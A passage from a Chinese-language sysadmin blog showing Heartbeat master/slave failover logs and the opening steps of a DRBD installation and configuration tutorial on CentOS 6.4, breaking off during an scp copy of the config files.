<h2 id="3-在master节点上查看启动日志"><a href="#3-在master节点上查看启动日志" class="headerlink" title="3.在master节点上查看启动日志"></a>3.在master节点上查看启动日志</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[root@master ha.d]<span class="comment"># tail -f /var/log/ha-log</span></div><div class="line">Apr 26 21:11:48 master heartbeat: [42033]: info: Starting child client <span class="string">"/usr/lib64/heartbeat/ipfail"</span> (501,501)</div><div class="line">Apr 26 21:11:48 master heartbeat: [42033]: info: Starting child client <span class="string">"/usr/lib64/heartbeat/dopd"</span> (501,501)</div><div class="line">Apr 26 21:11:48 mster heartbeat: [42062]: info: Starting <span class="string">"/usr/lib64/heartbeat/ipfail"</span> as uid 501  gid 501 (pid 42062)</div><div class="line">Apr 26 21:11:48 mster heartbeat: [42064]: info: Starting <span class="string">"/usr/lib64/heartbeat/dopd"</span> as uid 501  gid 501 (pid 42064)</div><div class="line">Apr 26 21:11:48 mster heartbeat: [42061]: info: Local Resource acquisition completed.</div><div class="line">Apr 26 21:11:48 mster heartbeat: [42033]: info: Initial resource acquisition complete (req_our_resources)</div><div class="line">Apr 26 21:11:48 mster ipfail: [42062]: ERROR: auto_failback <span class="built_in">set</span> to incompatible legacy option.</div><div class="line">Apr 26 21:11:48 mster heartbeat: [42033]: WARN: Managed /usr/lib64/heartbeat/ipfail process 42062 exited with <span class="built_in">return</span> code 100.</div><div class="line">Apr 26 21:11:48 mster heartbeat: [42033]: info: Status update <span class="keyword">for</span> slave: status active</div><div class="line">harc[42104]:  2014/04/26_21:11:48 info: Running /usr/etc/ha.d//rc.d/status status</div><div class="line"><span class="comment">#说明启动成功</span></div></pre></td></tr></table></figure>
<h3 id="4-切换主备"><a href="#4-切换主备" class="headerlink" title="4.切换主备"></a>4.切换主备</h3><h4 id="在master节点停掉heartbeat"><a href="#在master节点停掉heartbeat" class="headerlink" title="在master节点停掉heartbeat"></a>在master节点停掉heartbeat</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[root@master scripts]<span class="comment"># /etc/init.d/heartbeat stop</span></div></pre></td></tr></table></figure>
<h4 id="查看slave日志是否能自动切换至slave节点"><a href="#查看slave日志是否能自动切换至slave节点" class="headerlink" title="查看slave日志是否能自动切换至slave节点"></a>查看slave日志是否能自动切换至slave节点</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">[root@slave scripts]<span class="comment"># tail -f /var/log/ha-log</span></div><div class="line"><span class="comment">#显示master节点已经shutdown</span></div><div class="line">Apr 26 21:21:27 slave heartbeat: [42054]: info: Received shutdown notice from <span class="string">'master'</span>.</div><div class="line">Apr 26 21:21:27 slave heartbeat: [42054]: info: Resources being acquired from master.</div><div class="line">harc[42118]:  2014/04/26_21:21:27 info: Running /usr/etc/ha.d//rc.d/status status</div><div class="line">Apr 26 21:21:27 slave heartbeat: [42119]: info: No <span class="built_in">local</span> resources [/usr/share/heartbeat/ResourceManager listkeys slave] to acquire.</div><div class="line">mach_down[42148]:  2014/04/26_21:21:27 info: Taking over resource group drbddisk::r0</div><div class="line">ResourceManager[42175]: 2014/04/26_21:21:27 info: Acquiring resource group: master drbddisk::r0 Filesystem::/dev/drbd0::/raid10::ext4 mysqld IPaddr::192.168.1.254/24/eth0</div><div class="line">ResourceManager[42175]: 2014/04/26_21:21:27 info: Running /etc/ha.d/resource.d/drbddisk r0 start</div><div class="line">Filesystem[42239]:  2014/04/26_21:21:27 INFO: Resource is stopped</div><div class="line">ResourceManager[42175]: 2014/04/26_21:21:27 info: Running /etc/ha.d/resource.d/Filesystem /dev/drbd0 /raid10 ext4 start</div><div class="line">Filesystem[42320]:  2014/04/26_21:21:27 INFO: Running start <span class="keyword">for</span> /dev/drbd0 on /raid10</div><div class="line">Filesystem[42312]:  2014/04/26_21:21:28 INFO: Success</div><div class="line">ResourceManager[42175]: 2014/04/26_21:21:28 info: Running /etc/ha.d/resource.d/mysqld start</div><div class="line">Apr 26 21:21:39 slave heartbeat: [42054]: WARN: node master: is dead</div><div class="line">Apr 26 21:21:39 slave heartbeat: [42054]: info: Dead node master gave up resources.</div><div class="line">Apr 26 21:21:39 slave heartbeat: [42054]: info: Resources being acquired from master.</div><div class="line">Apr 26 21:21:39 slave heartbeat: [42054]: info: Link master:eth0 dead.</div><div class="line">Apr 26 21:21:39 slave heartbeat: [42054]: info: Link master:eth1 dead.</div><div class="line">Apr 26 21:21:41 slave heartbeat: [42614]: info: No <span class="built_in">local</span> resources [/usr/share/heartbeat/ResourceManager listkeys slave] to acquire.</div><div class="line">Apr 26 21:21:41 slave heartbeat: [42054]: info: Initial resource acquisition complete (req_our_resources)</div><div class="line">IPaddr[42642]:  2014/04/26_21:21:42 INFO: Resource is stopped</div><div class="line"><span class="comment">#显示slave节点的VIP已经运行</span></div><div class="line">ResourceManager[42175]: 2014/04/26_21:21:42 info: Running /etc/ha.d/resource.d/IPaddr 192.168.1.254/24/eth0 start</div><div class="line">IPaddr[42727]:  2014/04/26_21:21:42 INFO: Using calculated netmask <span class="keyword">for</span> 192.168.1.254: 255.255.255.0</div><div class="line">IPaddr[42727]:  2014/04/26_21:21:42 INFO: <span class="built_in">eval</span> ifconfig eth0:0 192.168.1.254 netmask 255.255.255.0 broadcast 192.168.1.255</div><div class="line">IPaddr[42701]:  2014/04/26_21:21:42 INFO: Success</div><div class="line">mach_down[42148]:  2014/04/26_21:21:42 info: mach_down takeover complete <span class="keyword">for</span> node master.</div><div class="line">harc[42820]:  2014/04/26_21:21:42 info: Running /usr/etc/ha.d//rc.d/status status</div><div class="line">mach_down[42837]:  2014/04/26_21:21:42 info: Taking over resource group drbddisk::r0</div><div class="line">ResourceManager[42864]: 2014/04/26_21:21:43 info: Acquiring resource group: master drbddisk::r0 Filesystem::/dev/drbd0::/raid10::ext4 mysqld IPaddr::192.168.1.254/24/eth0</div><div class="line"><span class="comment">#显示slave的mysql和drbd服务已经启动成功</span></div><div class="line">Filesystem[42906]:  2014/04/26_21:21:43 INFO: Running OK</div><div class="line">IPaddr[42987]:  2014/04/26_21:21:43 INFO: Running OK</div><div class="line">mach_down[42837]:  2014/04/26_21:21:43 info: mach_down takeover complete <span class="keyword">for</span> node master.</div></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HA集群/">HA集群</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-HA集群/4. DRBD安装配置、工作原理及故障恢复" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/09/03/HA集群/4. DRBD安装配置、工作原理及故障恢复/" class="article-date">
  	<time datetime="2017-09-02T18:04:46.008Z" itemprop="datePublished">2017-09-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/03/HA集群/4. DRBD安装配置、工作原理及故障恢复/">
        DRBD安装配置、工作原理及故障恢复
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="一、DRBD简介"><a href="#一、DRBD简介" class="headerlink" title="一、DRBD简介"></a>一、DRBD简介</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DRBD的全称为：Distributed ReplicatedBlock Device(DRBD)分布式块设备复制,DRBD是由内核模块和相关脚本而构成，用以构建高可用性的集群。其实现方式是通过网络来镜像整个设备。你可以把它看作是一种网络RAID。它允许用户在远程机器上建立一个本地块设备的实时镜像。</p>
<h2 id="二、DRBD是如何工作的呢"><a href="#二、DRBD是如何工作的呢" class="headerlink" title="二、DRBD是如何工作的呢?"></a>二、DRBD是如何工作的呢?</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;(DRBD Primary)负责接收数据，把数据写到本地磁盘并发送给另一台主机(DRBD Secondary)。另一个主机再将数据存到自己的磁盘中。目前，DRBD每次只允许对一个节点进行读写访问，但这对于通常的故障切换高可用集群来说已经足够用了。有可能以后的版本支持两个节点进行读写存取。</p>
<h2 id="三、DRBD与HA的关系"><a href="#三、DRBD与HA的关系" class="headerlink" title="三、DRBD与HA的关系"></a>三、DRBD与HA的关系</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个DRBD系统由两个节点构成，与HA集群类似，也有主节点和备用节点之分，在带有主要设备的节点上，应用程序和操作系统可以运行和访问DRBD设备（/dev/drbd*）。在主节点写入的数据通过DRBD设备存储到主节点的磁盘设备中，同时，这个数据也会自动发送到备用节点对应的DRBD设备，最终写入备用节点的磁盘设备上，在备用节点上，DRBD只是将数据从DRBD设备写入到备用节点的磁盘中。现在大部分的高可用性集群都会使用共享存储，而DRBD也可以作为一个共享存储设备，使用DRBD不需要太多的硬件的投资。因为它在TCP/IP网络中运行，所以，利用DRBD作为共享存储设备，要节约很多成本，因为价格要比专用的存储网络便宜很多；其性能与稳定性方面也不错</p>
<h2 id="四、DRBD复制模式"><a href="#四、DRBD复制模式" class="headerlink" title="四、DRBD复制模式"></a>四、DRBD复制模式</h2><h3 id="协议A："><a href="#协议A：" class="headerlink" title="协议A："></a>协议A：</h3><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;异步复制协议。一旦本地磁盘写入已经完成，数据包已在发送队列中，则写被认为是完成的。在一个节点发生故障时，可能发生数据丢失，因为被写入到远程节点上的数据可能仍在发送队列。尽管，在故障转移节点上的数据是一致的，但没有及时更新。这通常是用于地理上分开的节点</p>
<h3 id="协议B："><a href="#协议B：" class="headerlink" title="协议B："></a>协议B：</h3><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;内存同步（半同步）复制协议。一旦本地磁盘写入已完成且复制数据包达到了对等节点则认为写在主节点上被认为是完成的。数据丢失可能发生在参加的两个节点同时故障的情况下，因为在传输中的数据可能不会被提交到磁盘</p>
<h3 id="协议C："><a href="#协议C：" class="headerlink" title="协议C："></a>协议C：</h3><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;同步复制协议。只有在本地和远程节点的磁盘已经确认了写操作完成，写才被认为完成。没有任何数据丢失，所以这是一个群集节点的流行模式，但I / O吞吐量依赖于网络带宽</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般使用协议C，但选择C协议将影响流量，从而影响网络时延。为了数据可靠性，我们在生产环境使用时须慎重选项使用哪一种协议</p>
<h2 id="160-160-160-160-160-160-160-160-四、-DRBD工作原理图"><a href="#160-160-160-160-160-160-160-160-四、-DRBD工作原理图" class="headerlink" title="&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;四、 DRBD工作原理图"></a>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;四、 DRBD工作原理图</h2><p>DRBD是linux的内核的存储层中的一个分布式存储系统，可用使用DRBD在两台Linux服务器之间共享块设备，共享文件系统和数据。类似于一个网络RAID-1的功能，如图所示：</p>
<p><img src="https://github.com/hcldirgit/image/blob/master/DRBD%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E3%80%81%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%8F%8A%E6%95%85%E9%9A%9C%E6%81%A2%E5%A4%8D/01.gif?raw=true" alt=""></p>
<h2 id="五、环境介绍及安装前准备"><a href="#五、环境介绍及安装前准备" class="headerlink" title="五、环境介绍及安装前准备"></a>五、环境介绍及安装前准备</h2><h3 id="环境介绍："><a href="#环境介绍：" class="headerlink" title="环境介绍："></a>环境介绍：</h3><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统版本：CentOS 6.4_x86_64</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DRBD软件：drbd-8.4.3-33.el6.x86_64 drbd-kmdl-2.6.32-358.el6-8.4.3-33.el6.x86_64 <a href="http://rpmfind.net" target="_blank" rel="external">下载地址</a></p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意：这里两个软件的版本必须使用一致，而drbd-kmdl的版本要与当前系统的版本相对应，当然在实际应用中需要根据自己的系统平台下载符合需要的软件版本;查看系统版本 “uname -r”</p>
<h3 id="安装前准备："><a href="#安装前准备：" class="headerlink" title="安装前准备："></a>安装前准备：</h3><h4 id="1-每个节点的主机名称须跟”uname-n”命令的执行结果一样"><a href="#1-每个节点的主机名称须跟”uname-n”命令的执行结果一样" class="headerlink" title="1.每个节点的主机名称须跟”uname -n”命令的执行结果一样"></a>1.每个节点的主机名称须跟”uname -n”命令的执行结果一样</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">######NOD1节点执行</span></div><div class="line">sed -i <span class="string">'s@\(HOSTNAME=\).*@\1nod1.allen.com@g'</span> /etc/sysconfig/network</div><div class="line">hostname nod1.allen.com</div><div class="line"><span class="comment">######NOD2节点执行</span></div><div class="line">sed -i <span class="string">'s@\(HOSTNAME=\).*@\1nod2.allen.com@g'</span> /etc/sysconfig/network</div><div class="line">hostname nod2.allen.com</div><div class="line">注释：修改文件须重启系统生效，这里先修改文件然后执行命令修改主机名称可以不用重启</div></pre></td></tr></table></figure>
<h4 id="2-两个节点的主机名称和对应的IP地址可以正常解析"><a href="#2-两个节点的主机名称和对应的IP地址可以正常解析" class="headerlink" title="2.两个节点的主机名称和对应的IP地址可以正常解析"></a>2.两个节点的主机名称和对应的IP地址可以正常解析</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">######在NOD1与NOD2节点执行</span></div><div class="line">cat &gt; /etc/hosts &lt;&lt; EOF</div><div class="line">192.168.137.225 nod1.allen.com nod1</div><div class="line">192.168.137.222 nod2.allen.com nod2</div><div class="line">EOF</div></pre></td></tr></table></figure>
<h4 id="3-配置epel的yum源-下载并安装"><a href="#3-配置epel的yum源-下载并安装" class="headerlink" title="3.配置epel的yum源 下载并安装"></a>3.配置epel的yum源 <a href="http://mirrors.yun-idc.com/epel/6/x86_64/epel-release-6-8.noarch.rpm" target="_blank" rel="external">下载并安装</a></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">######在NOD1与NOD2节点安装</span></div><div class="line">rpm -ivh epel-release-6-8.noarch.rpm</div></pre></td></tr></table></figure>
<h4 id="4-需要为两个节点分别提供大小相同的分区"><a href="#4-需要为两个节点分别提供大小相同的分区" class="headerlink" title="4.需要为两个节点分别提供大小相同的分区"></a>4.需要为两个节点分别提供大小相同的分区</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">######在NOD1节点上创建分区，分区大小必须与NOD2节点保持一样</span></div><div class="line">[root@nod1 ~]<span class="comment"># fdisk /dev/sda</span></div><div class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</div><div class="line">Command action</div><div class="line"> e extended</div><div class="line"> p primary partition (1-4)</div><div class="line">p</div><div class="line">Partition number (1-4): 3</div><div class="line">First cylinder (7859-15665, default 7859):</div><div class="line">Using default value 7859</div><div class="line">Last cylinder, +cylinders or +size&#123;K,M,G&#125; (7859-15665, default 15665): +2G</div><div class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): w</div><div class="line">[root@nod1 ~]<span class="comment"># partx /dev/sda #让内核重新读取分区</span></div><div class="line"><span class="comment">######查看内核有没有识别分区，如果没有需要重新启动，这里没有识别需要重启系统</span></div><div class="line">[root@nod1 ~]<span class="comment"># cat /proc/partitions</span></div><div class="line">major minor  <span class="comment">#blocks name</span></div><div class="line"> 8 0 125829120 sda</div><div class="line"> 8 1 204800 sda1</div><div class="line"> 8 2 62914560 sda2</div><div class="line"> 253 0 20971520 dm-0</div><div class="line"> 253 1 2097152 dm-1</div><div class="line"> 253 2 10485760 dm-2</div><div class="line"> 253 3 20971520 dm-3</div><div class="line">[root@nod1 ~]<span class="comment"># reboot</span></div></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment">######在NOD2节点上创建分区，分区大小必须与NOD1节点保持一样</span></div><div class="line">[root@nod2 ~]<span class="comment"># fdisk /dev/sda</span></div><div class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): n</div><div class="line">Command action</div><div class="line"> e extended</div><div class="line"> p primary partition (1-4)</div><div class="line">p</div><div class="line">Partition number (1-4): 3</div><div class="line">First cylinder (7859-15665, default 7859):</div><div class="line">Using default value 7859</div><div class="line">Last cylinder, +cylinders or +size&#123;K,M,G&#125; (7859-15665, default 15665): +2G</div><div class="line">Command (m <span class="keyword">for</span> <span class="built_in">help</span>): w</div><div class="line">[root@nod2 ~]<span class="comment"># partx /dev/sda #让内核重新读取分区</span></div><div class="line"><span class="comment">######查看内核有没有识别分区，如果没有需要重新启动，这里没有识别需要重启系统</span></div><div class="line">[root@nod2 ~]<span class="comment"># cat /proc/partitions</span></div><div class="line">major minor  <span class="comment">#blocks name</span></div><div class="line"> 8 0 125829120 sda</div><div class="line"> 8 1 204800 sda1</div><div class="line"> 8 2 62914560 sda2</div><div class="line"> 253 0 20971520 dm-0</div><div class="line"> 253 1 2097152 dm-1</div><div class="line"> 253 2 10485760 dm-2</div><div class="line"> 253 3 20971520 dm-3</div><div class="line">[root@nod2 ~]<span class="comment"># reboot</span></div></pre></td></tr></table></figure>
<h2 id="六、安装并配置DRBD"><a href="#六、安装并配置DRBD" class="headerlink" title="六、安装并配置DRBD"></a>六、安装并配置DRBD</h2><h3 id="1-在NOD1与NOD2节点上安装DRBD软件包"><a href="#1-在NOD1与NOD2节点上安装DRBD软件包" class="headerlink" title="1.在NOD1与NOD2节点上安装DRBD软件包"></a>1.在NOD1与NOD2节点上安装DRBD软件包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">######NOD1</span></div><div class="line">[root@nod1 ~]<span class="comment"># ls drbd-*</span></div><div class="line">drbd-8.4.3-33.el6.x86_64.rpm drbd-kmdl-2.6.32-358.el6-8.4.3-33.el6.x86_64.rpm</div><div class="line">[root@nod1 ~]<span class="comment"># yum -y install drbd-*.rpm</span></div><div class="line"><span class="comment">######NOD2</span></div><div class="line">[root@nod2 ~]<span class="comment"># ls drbd-*</span></div><div class="line">drbd-8.4.3-33.el6.x86_64.rpm drbd-kmdl-2.6.32-358.el6-8.4.3-33.el6.x86_64.rpm</div><div class="line">[root@nod2 ~]<span class="comment"># yum -y install drbd-*.rpm</span></div></pre></td></tr></table></figure>
<h3 id="2-查看DRBD配置文件"><a href="#2-查看DRBD配置文件" class="headerlink" title="2.查看DRBD配置文件"></a>2.查看DRBD配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">ll /etc/drbd.conf;ll /etc/drbd.d/</div><div class="line">-rw-r--r-- 1 root root 133 May 14 21:12 /etc/drbd.conf <span class="comment">#主配置文件</span></div><div class="line">total 4</div><div class="line">-rw-r--r-- 1 root root 1836 May 14 21:12 global_common.conf <span class="comment">#全局配置文件</span></div><div class="line"><span class="comment">######查看主配置文件内容</span></div><div class="line">cat /etc/drbd.conf</div><div class="line"><span class="comment">######主配置文件中包含了全局配置文件及"drbd.d/"目录下以.res结尾的文件</span></div><div class="line"><span class="comment"># You can find an example in /usr/share/doc/drbd.../drbd.conf.example</span></div><div class="line">include <span class="string">"drbd.d/global_common.conf"</span>;</div><div class="line">include <span class="string">"drbd.d/*.res"</span>;</div></pre></td></tr></table></figure>
<h3 id="3-修改配置文件如下："><a href="#3-修改配置文件如下：" class="headerlink" title="3.修改配置文件如下："></a>3.修改配置文件如下：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">[root@nod1 ~]<span class="comment">#vim /etc/drbd.d/global_common.conf</span></div><div class="line">global &#123;</div><div class="line">usage-count no; <span class="comment">#是否参加DRBD使用统计，默认为yes</span></div><div class="line"><span class="comment"># minor-count dialog-refresh disable-ip-verification</span></div><div class="line">&#125;</div><div class="line">common &#123;</div><div class="line">protocol C; <span class="comment">#使用DRBD的同步协议</span></div><div class="line">handlers &#123;</div><div class="line"><span class="comment"># These are EXAMPLE handlers only.</span></div><div class="line"><span class="comment"># They may have severe implications,</span></div><div class="line"><span class="comment"># like hard resetting the node under certain circumstances.</span></div><div class="line"><span class="comment"># Be careful when chosing your poison.</span></div><div class="line">pri-on-incon-degr <span class="string">"/usr/lib/drbd/notify-pri-on-incon-degr.sh; /usr/lib/drbd/notify-emergency-reboot.sh; echo b &gt; /proc/sysrq-trigger ; reboot -f"</span>;</div><div class="line">pri-lost-after-sb <span class="string">"/usr/lib/drbd/notify-pri-lost-after-sb.sh; /usr/lib/drbd/notify-emergency-reboot.sh; echo b &gt; /proc/sysrq-trigger ; reboot -f"</span>;</div><div class="line"><span class="built_in">local</span>-io-error <span class="string">"/usr/lib/drbd/notify-io-error.sh; /usr/lib/drbd/notify-emergency-shutdown.sh; echo o &gt; /proc/sysrq-trigger ; halt -f"</span>;</div><div class="line"><span class="comment"># fence-peer "/usr/lib/drbd/crm-fence-peer.sh";</span></div><div class="line"><span class="comment"># split-brain "/usr/lib/drbd/notify-split-brain.sh root";</span></div><div class="line"><span class="comment"># out-of-sync "/usr/lib/drbd/notify-out-of-sync.sh root";</span></div><div class="line"><span class="comment"># before-resync-target "/usr/lib/drbd/snapshot-resync-target-lvm.sh -p 15 -- -c 16k";</span></div><div class="line"><span class="comment"># after-resync-target /usr/lib/drbd/unsnapshot-resync-target-lvm.sh;</span></div><div class="line">&#125;</div><div class="line">startup &#123;</div><div class="line"><span class="comment"># wfc-timeout degr-wfc-timeout outdated-wfc-timeout wait-after-sb</span></div><div class="line">&#125;</div><div class="line">options &#123;</div><div class="line"><span class="comment"># cpu-mask on-no-data-accessible</span></div><div class="line">&#125;</div><div class="line">disk &#123;</div><div class="line">on-io-error detach; <span class="comment">#配置I/O错误处理策略为分离</span></div><div class="line"><span class="comment"># size max-bio-bvecs on-io-error fencing disk-barrier disk-flushes</span></div><div class="line"><span class="comment"># disk-drain md-flushes resync-rate resync-after al-extents</span></div><div class="line"><span class="comment"># c-plan-ahead c-delay-target c-fill-target c-max-rate</span></div><div class="line"><span class="comment"># c-min-rate disk-timeout</span></div><div class="line">&#125;</div><div class="line">net &#123;</div><div class="line">cram-hmac-alg <span class="string">"sha1"</span>; <span class="comment">#设置加密算法</span></div><div class="line">shared-secret <span class="string">"allendrbd"</span>; <span class="comment">#设置加密密钥</span></div><div class="line"><span class="comment"># protocol timeout max-epoch-size max-buffers unplug-watermark</span></div><div class="line"><span class="comment"># connect-int ping-int sndbuf-size rcvbuf-size ko-count</span></div><div class="line"><span class="comment"># allow-two-primaries cram-hmac-alg shared-secret after-sb-0pri</span></div><div class="line"><span class="comment"># after-sb-1pri after-sb-2pri always-asbp rr-conflict</span></div><div class="line"><span class="comment"># ping-timeout data-integrity-alg tcp-cork on-congestion</span></div><div class="line"><span class="comment"># congestion-fill congestion-extents csums-alg verify-alg</span></div><div class="line"><span class="comment"># use-rle</span></div><div class="line">&#125;</div><div class="line">syncer &#123;</div><div class="line">rate 1024M; <span class="comment">#设置主备节点同步时的网络速率</span></div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注释： on-io-error <strategy>策略可能为以下选项之一</strategy></p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;detach 分离：这是默认和推荐的选项，如果在节点上发生底层的硬盘I/O错误，它会将设备运行在Diskless无盘模式下</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pass_on：DRBD会将I/O错误报告到上层，在主节点上，它会将其报告给挂载的文件系统，但是在此节点上就往往忽略（因此此节点上没有可以报告的上层）</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-local-in-error：调用本地磁盘I/O处理程序定义的命令；这需要有相应的local-io-error调用的资源处理程序处理错误的命令；这就给管理员有足够自由的权力命令命令或是脚本调用local-io-error处理I/O错误</p>
<h3 id="4-添加资源文件"><a href="#4-添加资源文件" class="headerlink" title="4.添加资源文件:"></a>4.添加资源文件:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">[root@nod1 ~]<span class="comment"># vim /etc/drbd.d/drbd.res</span></div><div class="line">resource drbd &#123;</div><div class="line"> on nod1.allen.com &#123;  <span class="comment">#第个主机说明以on开头，后面是主机名称</span></div><div class="line"> device  /dev/drbd0;<span class="comment">#DRBD设备名称</span></div><div class="line"> disk  /dev/sda3; <span class="comment">#drbd0使用的磁盘分区为"sda3"</span></div><div class="line"> address 192.168.137.225:7789; <span class="comment">#设置DRBD监听地址与端口</span></div><div class="line"> meta-disk internal;</div><div class="line"> &#125;</div><div class="line"> on nod2.allen.com &#123;</div><div class="line"> device  /dev/drbd0;</div><div class="line"> disk  /dev/sda3;</div><div class="line"> address 192.168.137.222:7789;</div><div class="line"> meta-disk internal;</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="5-将配置文件为NOD2提供一份"><a href="#5-将配置文件为NOD2提供一份" class="headerlink" title="5.将配置文件为NOD2提供一份"></a>5.将配置文件为NOD2提供一份</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">[root@nod1 ~]<span class="comment"># scp /etc/drbd.d/&#123;global_common.conf,drbd.res&#125; nod2:/etc/drbd.d/</span></div><div class="line">The authenticity of host <span class="string">'nod2 (192.168.137.222)'</span> can<span class="string">'t be established.</span></div><div class="line"><span class="string">RSA key fingerprint is 29:d3:28:85:20:a1:1f:2a:11:e5:88:cd:25:d0:95:c7.</span></div><div class="line"><span class="string">Are you sure you want to continue connecting (yes/no)? yes</span></div><div class="line"><span class="string">Warning: Permanently added 